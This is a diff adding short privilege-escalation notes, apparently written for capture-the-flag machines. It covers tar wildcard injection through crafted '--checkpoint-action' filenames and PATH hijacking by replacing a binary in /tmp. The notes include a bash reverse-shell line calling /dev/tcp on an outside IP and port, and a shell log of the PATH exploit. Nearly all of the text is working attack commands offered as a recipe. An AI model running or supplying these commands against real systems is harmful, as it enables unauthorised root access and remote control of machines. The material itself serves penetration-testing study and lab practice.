@@ -1,0 +1,55 @@
+First see where the file is going
+
+such as the following:
+
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+As you can see there is a * behind the tgz, we can also see that 
+we are going to cd to /var/www/html
+
+Lets create a reverse shell
+
+cd /var/www/html
+
+echo "bash -i >& /dev/tcp/10.9.8.166/9999 0>&1" > shell
+
+chmod +x shell
+
+Now make a checkpoint for the script to stop at
+
+$ touch /var/www/html/--checkpoint=1
+$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
+
+Now wait (if a crontab) or exectue the file
+
+Should come back as a reverse shell for executing user (root)
+
+#CHANGING EXPORT PATH:
+
+[medical@localhost tmp]$ ls -la
+ls -la
+total 3792
+drwxrwxrwt  7 root     root        4096 Aug 28 05:35 ./
+drwxr-xr-x 21 root     root        4096 Aug 28 05:06 ../
+drwxrwxrwt  2 root     root        4096 Aug 28 05:06 .ICE-unix/
+-r--r--r--  1 root     root          11 Aug 28 05:06 .X0-lock
+drwxrwxrwt  2 root     root        4096 Aug 28 05:06 .X11-unix/
+-rw-r--r--  1 root     root        1570 Aug 28 05:06 ddebug.log
+-rwxrwxrwx  1 medical  medical        8 Aug 26 00:30 fdisk*
+drwx------  2 medical  medical     4096 Aug 28 05:35 gpg-pbWpkD/
+drwx------  2 medical  medical     4096 Aug 26 00:16 gpg-t4amvK/
+drwx------  2 almirant almirant    4096 Jul 29  2020 gpg-ycbRQr/
+-rw-------  1 root     root           0 Jul 29  2020 init.vQ5ZLd
+-rw-r--r--  1 apache   apache   3841560 Jul 29  2020 setup_dump.sql
+
+[medical@localhost tmp]$ echo "/bin/sh" > fdisk
+echo "/bin/sh" > fdisk
+[medical@localhost tmp]$ chmod 777 fdisk
+chmod 777 fdisk
+[medical@localhost tmp]$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+
+(OBVIOUSLY IT WON'T BE fdisk EVERYTIME, NEED TO KNOW WHAT TO CHANGE)
